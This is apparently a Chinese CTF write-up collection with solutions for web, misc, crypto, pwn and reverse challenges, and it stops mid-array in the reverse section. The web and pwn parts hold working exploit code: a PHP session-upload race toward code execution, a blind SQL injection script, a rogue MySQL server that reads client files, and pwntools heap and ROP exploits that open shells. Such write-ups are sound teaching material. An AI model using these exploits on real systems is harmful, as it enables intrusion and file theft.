包含session文件以RCE这道题默认没有session，我们可以通过伪造固定session,post一个空文件以及恶意的PHP_SESSION_UPLOAD_PROGRES来执行构造的任意代码。 PHP_SESSION_UPLOAD_PROGRES是一个常量，他是php.ini设置中session.upload_progress.name的默认值，session.upload_progress是PHP5.4的新特征。下面是我本地php5.4的默认配置： 讲一下个别配置的含义： session.upload_progress.cleanup 是否在上传结束清除上传进度信息，默认为on session.upload_progress.enabled 是否开启记录上传进度信息，默认为on session.uploadprogress.prefix 存储上传进度信息的变量前缀，默认为upload_progress session.upload_progress.name POST中代表进度信息的常量名称，默认为PHP_SESSION_UPLOAD_PROGRES如果 _POST[session.upload_progress.name]没有被设置, 则不会报告进度 可以看到，session.upload_progress.cleanup默认是开启的，这意味着我们上传文件后，进度信息会被删除，我们也就不能直接包含session文件，这就需要利用条件竞争，趁进度信息还未被删除时包含session文件。 条件竞争 一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计不合理时，将会导致一系列问题的发生。 我们写一个脚本，一个线程不断上传空文件（同时post伪造的恶意进度信息），另一些线程不停地访问session临时文件，总有几次我们会在服务端还没有删除进度信息时访问到session临时文件。 python脚本： import requests import threading url='http://127.0.0.1/index.php' r=requests.session() headers={ \"Cookie\":'PHPSESSID=123' } def POST(): while True: file={ \"upload\":('','') #上传无效的空文件 } data={ \"PHP_SESSION_UPLOAD_PROGRESS\":'' #恶意进度信息，readfile将直接输出文件内容 } r.post(url,files=file,headers=headers,data=data) def READ(): while True: event.wait() t=r.get(\"http://127.0.0.1/index.php?file=../tmp/tmp/sess_123\") if 'flag' not in t.text: print('[+]retry') else: print(t.text) event.clear() event=threading.Event() event.set() threading.Thread(target=POST,args=()).start() threading.Thread(target=READ,args=()).start() threading.Thread(target=READ,args=()).start() threading.Thread(target=READ,args=()).start() RCE拿到flag内容：因为比赛是下发的docker容器，写shell意义不大，但是的确通过这个脚本读到了flag。这个方法依赖于php.ini的一些配置选项，以及session目录的信息，不过大多数情况下这些都是默认的，很容易可以猜到 还有更多利用方法，各位师傅们自由发挥。 全宇宙最简单的SQL 题目 知识点：布尔型盲注，Waf Bypass，MySQL 客户端任意文件读取 1、打开靶机。 2、然后测试提交，抓包看看。 3、放到 postman 里试试。 4、不断 fuzz。主要观察到以下几个现象。 username 有注入点。 过滤了 or。 当最终拼接语句无错误时无论结果如何均为 登录失败。 当最终语句有错时返回为 数据库操作失败。 5、根据这两个返回，就可以判断其为 布尔型盲注 了。 6、综上，测试 payload 如下。 username = admin’ union select cot(1 and left(database(),1)>’a’);# 当 left(database(),1)>’a’) 也就是条件为真时，1 and left(database(),1)>’a’ 整个表达式大于 0，没有错误爆出。 当条件为假时，1 and left(database(),1)>’a’ 等于 0，有错误爆出。 上面所说有语句正确执行与否时返回不同，就可以这样区分了。 7、从这儿 http://zzqsmile.top/2018/06/04/python3/2018-06-04-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/ 找了个小脚本，把我们的 payload 放进去，修改一下返回判断条件。 同时注意 or 被过滤了，所以 information_schema 也传不上去了。这里就得自己猜猜表名了。 #!/usr/bin/env python3 # -*- coding: utf-8 -*- import requests def main(): get_all_databases(\"http://39.97.167.120:52105/\") def http_get(url, payload): result = requests.post(url, data={'username': 'admin' + payload, 'password': '123456'}) result.encoding = 'utf-8' if result.text.find('数据库操作失败') == -1: return True else: return False # 获取数据库 def get_all_databases(url): db_nums_payload = \"select count(*) from users\" db_numbers = half(url, db_nums_payload) print(\"长度为：%d\" % db_numbers) # 二分法函数 def half(url, payload): low = 0 high = 126 # print(standard_html) while low %d);#\" % (payload, mid) # print(mid_num_payload) # print(mid_html) if http_get(url, mid_num_payload): low = mid + 1 else: high = mid - 1 mid_num = int((low + high + 1) / 2) return mid_num if __name__ == '__main__': main() 8、不断 fuzz，当 长度不为 0 时就是找到表了。 0，没找到或没数据 1，找到了 9、找到表名为 user，知道表名，不知道列名，那就改下函数，如下面这样整，给表设别名。 # 获取数据库 def get_all_databases(url): db_nums_payload = \"select length(group_concat(a.1)) from (select 1, 2 union select * from user)a\" db_numbers = half(url, db_nums_payload) print(\"长度为：%d\" % db_numbers) db_payload = \"select group_concat(a.1) from (select 1, 2 union select * from user)a\" db_name = \"\" for y in range(1, db_numbers + 1): db_name_payload = \"ascii(substr((\" + db_payload + \"),%d,1))\" % ( y) db_name += chr(half(url, db_name_payload)) print(\"值：\" + db_name) 第一列是用户名。 参看资料：http://p0desta.com/2018/03/29/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/#1-10-1-%E5%88%AB%E5%90%8D 10、再来第二列试试。 # 获取数据库 def get_all_databases(url): db_nums_payload = \"select length(group_concat(a.2)) from (select 1, 2 union select * from user)a\" db_numbers = half(url, db_nums_payload) print(\"长度为：%d\" % db_numbers) db_payload = \"select group_concat(a.2) from (select 1, 2 union select * from user)a\" db_name = \"\" for y in range(1, db_numbers + 1): db_name_payload = \"ascii(substr((\" + db_payload + \"),%d,1))\" % ( y) db_name += chr(half(url, db_name_payload)) print(\"值：\" + db_name) 第二列就是密码了。 似乎还提示我们 flag 在 /fll1llag_h3r3。 11、先用这组用户名密码登录看看，看到可以登录成功。 12、很熟悉的页面，祭出我们的祖传恶意 MySQL 服务器吧。改好要读取的文件，在自己的服务器上运行。 #!/usr/bin/env python #coding: utf8 import socket import asyncore import asynchat import struct import random import logging import logging.handlers PORT = 3306 log = logging.getLogger(__name__) log.setLevel(logging.DEBUG) # tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab') tmp_format = logging.StreamHandler() tmp_format.setFormatter(logging.Formatter(\"%(asctime)s:%(levelname)s:%(message)s\")) log.addHandler( tmp_format ) filelist = ( # r'c:\\boot.ini', # r'c:\\windows\\win.ini', # r'c:\\windows\\system32\\drivers\\etc\\hosts', '/fll1llag_h3r3', # '/etc/shadow', ) #================================================ #=======No need to change after this lines======= #================================================ __author__ = 'Gifts' def daemonize(): import os, warnings if os.name != 'posix': warnings.warn('Cant create daemon on non-posix system') return if os.fork(): os._exit(0) os.setsid() if os.fork(): os._exit(0) os.umask(0o022) null=os.open('/dev/null', os.O_RDWR) for i in xrange(3): try: os.dup2(null, i) except OSError as e: if e.errno != 9: raise os.close(null) class LastPacket(Exception): pass class OutOfOrder(Exception): pass class mysql_packet(object): packet_header = struct.Struct('> 16, 0, self.packet_num) result = \"{0}{1}\".format( header, self.payload ) return result def __repr__(self): return repr(str(self)) @staticmethod def parse(raw_data): packet_num = ord(raw_data[0]) payload = raw_data[1:] return mysql_packet(packet_num, payload) class http_request_handler(asynchat.async_chat): def __init__(self, addr): asynchat.async_chat.__init__(self, sock=addr[0]) self.addr = addr[1] self.ibuffer = [] self.set_terminator(3) self.state = 'LEN' self.sub_state = 'Auth' self.logined = False self.push( mysql_packet( 0, \"\".join(( '\\x0a', # Protocol '5.6.28-0ubuntu0.14.04.1' + '\\0', '\\x2d\\x00\\x00\\x00\\x40\\x3f\\x59\\x26\\x4b\\x2b\\x34\\x60\\x00\\xff\\xf7\\x08\\x02\\x00\\x7f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x68\\x69\\x59\\x5f\\x52\\x5f\\x63\\x55\\x60\\x64\\x53\\x52\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00', )) ) ) self.order = 1 self.states = ['LOGIN', 'CAPS', 'ANY'] def push(self, data): log.debug('Pushed: %r', data) data = str(data) asynchat.async_chat.push(self, data) def collect_incoming_data(self, data): log.debug('Data recved: %r', data) self.ibuffer.append(data) def found_terminator(self): data = \"\".join(self.ibuffer) self.ibuffer = [] if self.state == 'LEN': len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1 if len_bytes 13、在页面上填好信息，点提交。 14、到自个儿的服务器上看看，Flag 文件也读到了。 15、Flag 到手~ Flag：flag{3f4abe8b-aa4a-bb48-c2f9f04d045beade} love_math 题目 知识点：命令注入与条件利用 1、打开靶机。发现似乎是一个计算器。 2、提交，抓包看看。 3、可以看到直接提交给 calc.php 的，那么我们就访问这个文件看看。 4、源码出来了。 = 80) { die(\"太长了不会算\"); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(\"请不要输入奇奇怪怪的字符\"); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\"请不要输入奇奇怪怪的函数\"); } } //帮你算出答案 eval('echo '.$content.';'); } 5、审计一下源码。 先判断 c 这个参数有没有，有的话就判断长度，小于 80 字节就继续往下走。然后拦截一大堆符号，再判断参数里的文本段是否在函数白名单内，都在的话，就继续执行。 6、来看看他的函数表吧。 http://www.w3school.com.cn/php/php_ref_math.asp 这个特别有意思，base_convert() 可以任意进制转换，那么我们就可以把十进制数转换为 36 进制数，这样 a~z 我们就都可以用了。 7、来一个试试。 转换工具：http://www.atool9.com/hexconvert.php 8、构造 payload 试试。访问 /calc.php?c=base_convert(55490343972,10,36)() 9、成了，那继续研究怎么绕过长度限制吧。这里的思路，就是先拿到 _GET，然后用里面的参数来作为函数的名字（这里要读文件，就是 file_get_contents 了）和参数（文件路径）了。 10、不断 fuzz，发现如下的 payload 可以。 /calc.php?abs=flag.php&pow=show_source&c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pow}($$pi{abs}) 解释一下，相当于先定义一个 pi 变量，值为 base_convert(37907361743,10,36)(dechex(1598506324)) 的结果，这里两个函数都是白名单里的 可以绕过。而 dexhex 则就是先把 “_GET” 的十进制表示转换为十六进制表示，然后其作为 base_convert(37907361743,10,36)() 的参数，而这里 base_convert(37907361743,10,36)() 就相当于 hex2bin()，把 hex 转换成文本。然后，得到 _GET 以后再后面用 ($$pi){pow}($$pi{abs}) 来调用 pow 参数里存的方法名，abs 参数里存的参数，这里的字段都在白名单，可以正确绕过。 11、打过去。 12、Flag 到手~ Flag：flag{79480116-456e-4a90-86e8-4b4b885354b9} RefSpace 通过 php伪协议 可以获得题目环境中的文件结构如下： ➜ html tree.├── app│ ├── flag.php│ ├── index.php│ └── Up10aD.php├── backup.zip├── flag.txt├── index.php├── robots.txt└── upload2 directories, 7 files 源码如下： 可以看到 index.php 中存在任意文件包含，但是限制了文件名后缀只能是 .php，而 app/Up10aD.php 文件中存在上传功能，刚好可以配合前面的文件包含进行 getshell 。具体可以参考：zip或phar协议包含文件 。getshell之后，只在服务器上发现了加密后的flag.txt。在 app/flag.php 开头添加上如下代码，访问时 $key 值随便填。 namespace interesting; function sha1($var) { // 调用类的私有、保护方法 $class = new \\ReflectionClass('interesting\\FlagSDK'); $method = $class->getMethod('getHash'); $method->setAccessible(true); $instance = $class->newInstance(); return $method->invoke($instance); } 其原理就是通过命名空间，定义一个同名函数 sha1 ，在代码调用时，会优先调用本命名空间中的同名函数。另外还有一个考点就是通过反射调用类的私有、保护方法，具体百度即可。绕过sha1的比较，我们就能拿到flag了，backup.zip/sdk开发文档.txt 中的 return \"too{young-too-simple}\" 只是个例子，其真正的语句类似 return openssl_decrypt(file_get_contents(‘flag路径), '加密算法', $key)。 其他解法: 解法二：作者：zsx Misc 作者：wu1a 签到题 打开摄像头后，有三个人被识别有绿圈，就代表成功了，cmd 界面弹出 flag saleae 一开始作为一个 web 手，完全没有接触过工控的题目，但受到题目名称的启发，搜了一下这个东西用什么软件打开，就下载了 Logic 这个软件，然后打开题目看到有过滤选项 而且只有 0 和 2 频道有波形图，调整过滤规则得到了导出后 然后编辑一下就是 flag 24c 打开给的 24c.logicdata 文件，得到：选择 i2c 过滤规则直接出现了 flag 字样直接就去提交了这个分离出来的 flag 然后一直报错，一度怀疑题目错了。直到看到有一段有读写规则的转换，才知道自己不清楚这些 flag 字段是怎么拼接的。因为对工控不是很熟悉，百度了一下 24C 芯片的数据读写规则如下，8bitdata 接上 1bitack我们导出一下获得的数据我们得到的三个字段分别为 f163bdf4e},flag{c4649e10-e9b5-4d90-a883-41c,ac现在根据规则对这三段进行拼接再导出写入的地址顺序表了解一下 24c 元件的工作原理后，再通过上表确认了 ac 并不是写在最后 flag 那一段后面的，而是插在 flag{c4649e10-e9b5-4d90-a883-41c 中的。这样就得到了拼接的顺序，得到了正确的 flag badusb 直接先打开读文件：直接调整规则进行分析，并查看数据分析结果，最终发现只在如下图所示的规则下找到了flag 字段在最后一段数据处发现了 flag导出编辑和昨天的第一题工控一样拼接后就得到了最后的 flag Crypto 作者：wu1a、匿名 puzzles 作者：匿名 Question0 这题就是计算一个四元一次方程组，使用Python里的numpy模块进行求解。 得到结果[4006. 3053. 2503. 2560.] 整理一下得到fa6bed9c7a00 Question1 question1思考了一会，尝试从26364809开始搜素数，发现26364809是第2个素数，26366033是第76个，26366621是第113个。成一个公差为37的等差数列。所以part1是第39个素数，即26365399。part1=1924dd7 Question2、3、4 第2 3 4题在网上都可以搜到类似的题目 第一就是简单的求极限和积分。 part2=(1+91+7+1)*77=7700 转换成flag格式 part2=1e14 第三题是一道物理题目->->代入数据，最后得到结果part3=18640转换成flag格式 part3=48d0 第四题考的是三重积分令x=rcosa,y=rsina。可以将上式转化为：这样就将三重积分转化成了三次定积分。并结合等式左边的式子得出结果。part4=40320 转化成flag格式 part4=9d80 最后拼接在一起得到flag Part_des Key map 为十六进制数，转换成二进制后发现为 768 位，即 16*48，是des加密的16轮子密钥，从网上找到 des 的解密脚本，修改一下即可解出 Warmup 打开脚本查看加密逻辑，发现每次 nc连上服务器后会自动生成随机的16位key和4 位prefix、 suffix，再用 prefix 和 suffix 生成 64 位的 count，然后用 count 和 key 生成 cipher。服务得到 我的输入，在后面拼接正确的 flag 后进行 aes 加密并输出。测试一下服务爆破即可 #coding:utf-8 #__author__:wu1a from pwn import * import string def boom(k,flag): for i in range(k,len(string)): payload = flag + string[i] p.sendline(payload) aaa = p.recvline()[17:].replace(\"\\n\",\"\") aaa = aaa[:(len(flag)+1)*2] # print aaa if aaa in flag_aes: print \"ok\",payload boom(0,payload) else: pass # context.log_level='debug' p = remote(\"fc32f84bc46ac22d97e5f876e3100922.kr-lab.com\",12345) string=\"{}\" + string.ascii_lowercase + \"-0123456789\" flag=\"flag\" p.recvuntil(\"Welcome to flag getting system\\n\") p.sendline(\"\") flag_aes=p.recvline()[17:].replace(\"\\n\",\"\") log.info(\"flag_aes -> \" + flag_aes) boom(0,flag) # p.interactive() Asymmetric 打开加密脚本后发现过程类似 RSA 加密，尝试用 RSA 解密，先分解 n 得到 pP=1657407551907933046558545060527940723781810462521183676934573856328183290415 404194886254720077100621286329426643663835514524985415605387445829227138086113 201767704015876746181218857199538311224872809784181103805973587479154209280538 60076414097300832349400288770613227105348835005596365488460445438176193451867 R=4 根据欧拉函数 p4-p3 计算 n，再计算得到 flag PWN 作者：warden、wu1a your_pwn 可重复利用的单字节读写的漏洞. 先直接读取栈上的返回地址泄露pie基址.然后构造ROP链打印库函数地址泄露libc.直接调用system(binsh);获得flag. from pwn import * context.log_level = 'debug' pop_rdi_ret = 0xd03 pop_rsi_r15_ret = 0xd01 #r = process(\"./pwn\") r = remote(\"1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com\",\"57856\") r.recvuntil(\"name:\") r.sendline(\"w4rd3n\") def get(p): i = 0 ll = 0 while(1): r.recvuntil(\"index\\n\") r.sendline(str(i + p)) data = r.recvuntil(\"value\\n\")[:-17] data = int(data[-2:],16) if(i daily remove的时候没有对index进行范围检测. 先利用unsorted bin泄露libc,再利用fastbin单链表泄露heap基址. 申请一个chunk,在里面伪造一个堆指针和对应的faker chunk.free掉这个faker chunk,通过edit构造其fd到bss上,由于length可控,通过remove构造出一个chunk头部绕过检查.成功fastbin attack,获得任意读写的能力,由于程序开了Full RELRO所以劫持__free_hook调用system(binsh);获得flag. from pwn import * context.log_level = 'debug' #r = process(\"./pwn\") ptr = 0x602060 r = remote(\"85c3e0fcae5e972af313488de60e8a5a.kr-lab.com\", \"58512\") def show(): r.sendline(str(1)) data = r.recvuntil(\"Your choice:\") return data def add(length, content): r.sendline(str(2)) r.recvuntil(\"of daily:\") r.sendline(str(length)) r.recvuntil(\"daily\\n\") r.send(content) r.recvuntil(\"Your choice:\") def edit(index, content): r.sendline(str(3)) r.recvuntil(\"of daily:\") r.sendline(str(index)) r.recvuntil(\"daily\\n\") r.send(content) r.recvuntil(\"Your choice:\") def remove(index): r.sendline(str(4)) r.recvuntil(\"of daily:\") r.sendline(str(index)) r.recvuntil(\"Your choice:\") r.recvuntil(\"Your choice:\") add(0x100, 'a')#0 add(0x100, 'b')#1 add(0x100, 'c')#2 add(0x100, 'd')#3 remove(0) remove(2) add(0x100, 'a' * 8)#0 add(0x100, 'a' * 8)#2 r.sendline(str(1)) r.recvuntil(\"aaaaaaaa\") heap = u64(r.recvuntil(\"1 :\")[:-3].ljust(8,'\\0')) - 0x220 r.recvuntil(\"aaaaaaaa\") libc = u64(r.recvuntil(\"3 :\")[:-3].ljust(8,'\\0')) - 0x3c4b78 print \"heap: \" + hex(heap) print \"libc: \" + hex(libc) remove(0) remove(1) remove(2) remove(3) add(0x60, p64(heap + 0x30) * 2 + p64(0) + p64(0x51))#0 add(0x20, 'a')#1 add(0x50, 'a')#2 add(0x20, 'a')#3 remove((heap + 0x18 - ptr - 8) / 0x10) edit(0, p64(0) * 3 + p64(0x51) + p64(ptr + 0x18)) remove(1) add(0x40, 'a')#1 add(0x40, 'a')#4 edit(4, p64(ptr)) edit(2, p64(0x100) + p64(ptr) + p64(0) * 4) edit(0, p64(0x100) + p64(ptr) + p64(0x100) + p64(libc + 0x3c67a8) + p64(0x100) + p64(libc + 0x18cd57)) edit(1, p64(libc + 0x045390)) #gdb.attach(r) r.sendline(str(4)) r.recvuntil(\"of daily:\") r.sendline(str(2)) r.interactive() baby_pwn ret2dl in x86,没有可供leak的函数.保护很少,想起之前的0ctf2018 babystack,修改脚本直接打. import sys import roputils from pwn import * context.log_level = 'debug' #r = process(\"./pwn\") r = remote(\"c346dfd9093dd09cc714320ffb41ab76.kr-lab.com\", \"56833\") rop = roputils.ROP('./pwn') addr_bss = rop.section('.bss') buf1 = 'A' * 0x2c buf1 += p32(0x8048390) + p32(0x804852D) + p32(0) + p32(addr_bss) + p32(100) r.send(buf1) buf2 = rop.string('/bin/sh') buf2 += rop.fill(20, buf2) buf2 += rop.dl_resolve_data(addr_bss + 20, 'system') buf2 += rop.fill(100, buf2) r.send(buf2) buf3 = 'A' * 0x2c + rop.dl_resolve_call(addr_bss + 20, addr_bss) r.send(buf3) #gdb.attach(r) r.interactive() Virtual 理解程序逻辑. 首先是store_instruction函数将输入通过分隔符分类为各种操作符并保存在堆中,store_num同理.其中三个堆块一个数据堆,一个操作符堆,一个栈(也是用来存数据的,存储操作符操作的数据). 重点就是op函数. 这里不断从操作符堆取出操作符(对应的数字),然后跳转到函数执行的地方,这里IDA反汇编有问题,没有识别出函数调用,实际上i会被赋值为函数调用的返回值. 这些函数操作栈中的数据并将结果放回栈中,所以使用数据前需要先push. 关键函数是load和save,知道偏移就可以任意读写.先使用load泄露堆上的堆地址,由于没开pie,通过-和/求出.got[puts]和此处偏移,再次load泄露libc,处理与system的偏移获得system地址.不过这里没办法复制保存数据,只能移动和计算,所以之前的偏移没了,通过同样操作调整一下再次获得.got[puts]偏移,调用save成功劫持puts@plt.突然发现username作用,开始试了/bin/sh,ls,cat flag什么的都是comment not found,最后/bin/bash成功. from pwn import * #context.log_level = 'debug' #r = process(\"./pwn\") r = remote(\"a569f7135ca8ce99c68ccedd6f3a83fd.kr-lab.com\", \"40003\") r.recvuntil(\"Your program name:\\n\") r.sendline(\"/bin/bash\") r.recvuntil(\"Your instruction:\\n\") payload = \"push push push load push sub div sub load push add\" payload += \" push push push load push sub div sub save\" #payload = \"push push push load push sub div sub load pop\" r.sendline(payload) #gdb.attach(r) r.recvuntil(\"Your stack data:\\n\") #payload = \"-1 8 -5 4210720\" payload = \"-1 8 -5 4210720 -172800 -1 8 -6 4210720\" #0x404020 = 4210720,offset = -172800,one_gadget = -173178 r.sendline(payload) #print r.recv() r.interactive() bms 远端环境是libc2.26,可以使用tcache攻击,利用double free把chunk分配在stdout附近,使tcache bin指向_IO_2_1_stdout_. 修改结构体泄露libc,再次使用tcache攻击分配chunk到__free_hook,劫持为one_gadget,调用free获得shell. from pwn import * context.log_level = 'debug' #r = process(\"./pwn\") r = remote(\"39.106.224.151\", \"60002\") def add(name, length, content): r.send(str(1)) r.recvuntil(\"book name:\") r.send(name) r.recvuntil(\"description size:\") r.send(str(length)) r.recvuntil(\"description:\") r.send(content) r.recvuntil(\">\\n\") def remove(index): r.sendline(str(2)) r.recvuntil(\"index:\") r.sendline(str(index)) r.recvuntil(\">\\n\") r.recvuntil(\"username:\") r.send(\"admin\\n\\x00\") r.recvuntil(\"password:\") r.send(\"frame\\n\\x00\") r.recvuntil(\">\\n\") add(\"a\", 0xf0, \"a\")#0 remove(0) remove(0) add(\"a\", 0xf0, p64(0x602020))#1 add(\"a\", 0xf0, p64(0x602020))#2 add(\"a\", 0xf0, p8(0x20))#3 r.send(str(1)) r.recvuntil(\"book name:\") r.send(\"a\") r.recvuntil(\"description size:\") r.send(str(0xf0)) r.recvuntil(\"description:\") r.send(p64(0xfbad2887) + p64(0x601F70) * 4)#4 libc = u64(r.recvuntil(\">\\n\")[:6].ljust(8, '\\0')) - 0x78460 add(\"a\", 0xe0, \"a\")#5 remove(5) remove(5) add(\"a\", 0xe0, p64(libc + 0x3dc8a8))#6 add(\"a\", 0xe0, p64(libc + 0x3dc8a8))#7 add(\"a\", 0xe0, p64(libc + 0x47c46))#8 r.sendline(str(2)) r.recvuntil(\"index:\") r.sendline(str(5)) #gdb.attach(r) print \"libc: \" + hex(libc) r.interactive() double 这题的点找了好久，一直没 get 到，（没注意题目名，手动滑稽），研究了各种姿势，回原点，两个同样的文件释放会报 double free 的错，才发现自己漏看了一块地方，然后利用文件内容一致，引用同一文件。实现 double free。然后 fastbin attack再次 diss，主办方的 check 竟然 system(“sh”) ，命令在容器里啥权限都没，还不让我过，搞得我只好找 onegadget from pwn import * context.log_level = \"debug\" p = process(\"./pwn\") p = remote(\"e095ff54e419a6e01532dee4ba86fa9c.kr-lab.com\",40002) elf = ELF('./pwn') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def add(content): p.recvuntil('> ') p.sendline('1') p.recvuntil('Your data:\\n') p.send(content) def edit(index,content): p.recvuntil('> ') p.sendline('3') p.recvuntil('Info index: ') p.sendline(str(index)) p.send(content) def show(index): p.recvuntil('> ') p.sendline('2') p.recvuntil('Info index: ') p.sendline(str(index)) def delete(index): p.recvuntil('> ') p.sendline('4') p.sendline(str(index)) add(0x50*'s'+'\\n') add(0x60*'s'+'\\n') add(0x60*'s'+'\\n') add(0x60*'b'+'\\n') delete(1) delete(3) delete(2) add(p64(0x4040bd).ljust(0x60,'c')+'\\n') add(0x60*'n'+'\\n') add(0x60*'m'+'\\n') payload = 'd'*3 + p64(0x4040e0) + p64(0x4040f0) + p32(0) + p32(20) + p64(elf.got['read'])+p64(0x4040f0) add((0x60*'\\x00')+'\\n') edit(0,payload+'\\n') show(0) readaddr = u64(p.recv(6).ljust(8,'\\x00')) libcaddr = readaddr - libc.symbols['read'] print \"libc---->\",hex(libcaddr) edit(0,p64(libcaddr + 0x4526a)+'\\n') p.sendline('icqf3f12bdf6e59569e295aacbd704b2') p.interactive() Reverse 作者：lizhirui、impakho bbvvmm 一道考察虚拟机和加密算法的逆向题。大致流程如下。 输入用户名和密码，用户名和密码会被分开校验。 用户名为 8字节 长度，先被 bin2hex 处理变成 16字节 长度。 sm4_keyext 进行密钥扩展，与处理后的用户名一起参与 sm4 加密。 加密结果进行 bin2hex 处理，再进行一个被修改过编码表的 base64 编码，最后比较 base64 的内容。 结合网上的代码进行修改，写出这部分的解密代码，得到用户名：badrer12。 import string base64_charset = 'IJLMNOPKABDEFGHCQRTUVWXSYZbcdefa45789+/6ghjklmnioprstuvqwxz0123y' def b64encode(origin_bytes): base64_bytes = ['{:0>8}'.format(str(bin(b)).replace('0b', '')) for b in origin_bytes] resp = '' nums = len(base64_bytes) // 3 remain = len(base64_bytes) % 3 integral_part = base64_bytes[0:3 * nums] while integral_part: tmp_unit = ''.join(integral_part[0:3]) tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]] resp += ''.join([base64_charset[i] for i in tmp_unit]) integral_part = integral_part[3:] if remain: remain_part = ''.join(base64_bytes[3 * nums:]) + (3 - remain) * '0' * 8 tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1] resp += ''.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * '=' return resp def b64decode(base64_str): base64_bytes = ['{:0>6}'.format(str(bin(base64_charset.index(s))).replace('0b', '')) for s in base64_str if s != '='] resp = bytearray() nums = len(base64_bytes) // 4 remain = len(base64_bytes) % 4 integral_part = base64_bytes[0:4 * nums] while integral_part: tmp_unit = ''.join(integral_part[0:4]) tmp_unit = [int(tmp_unit[x: x + 8], 2) for x in [0, 8, 16]] for i in tmp_unit: resp.append(i) integral_part = integral_part[4:] if remain: remain_part = ''.join(base64_bytes[nums * 4:]) tmp_unit = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)] for i in tmp_unit: resp.append(i) return resp Sbox = [ [0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05], [0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99], [0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62], [0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6], [0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8], [0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35], [0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0x78, 0x87], [0xD4, 0x00, 0x46, 0x57, 0x9F, 0xD3, 0x27, 0x52, 0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E], [0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1], [0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3], [0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F], [0xD5, 0xDB, 0x37, 0x45, 0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51], [0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8], [0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0], [0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84], [0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48] ] CK = [ 0x00070e15L, 0x1c232a31L, 0x383f464dL, 0x545b6269L, 0x70777e85L, 0x8c939aa1L, 0xa8afb6bdL, 0xc4cbd2d9L, 0xe0e7eef5L, 0xfc030a11L, 0x181f262dL, 0x343b4249L, 0x50575e65L, 0x6c737a81L, 0x888f969dL, 0xa4abb2b9L, 0xc0c7ced5L, 0xdce3eaf1L, 0xf8ff060dL, 0x141b2229L, 0x30373e45L, 0x4c535a61L, 0x686f767dL, 0x848b9299L, 